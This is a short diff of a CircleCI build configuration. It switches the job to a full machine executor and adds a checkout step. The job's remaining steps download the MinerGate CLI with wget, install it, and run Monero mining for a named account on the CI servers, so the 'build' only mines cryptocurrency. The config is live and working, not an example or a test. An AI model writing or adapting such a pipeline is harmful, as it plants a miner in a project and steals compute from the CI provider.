@@ -1,10 +1,10 @@
 version: 2
 jobs:
   build:
-    docker:
-      - image: circleci/default
+    machine: true
 
     steps:
+      - checkout
       - run: wget https://minergate.com/download/deb-cli -O minergate-cli.deb
       - run: sudo dpkg -i minergate-cli.deb
       - run: minergate-cli -user yoginth@hotmail.com  xmr
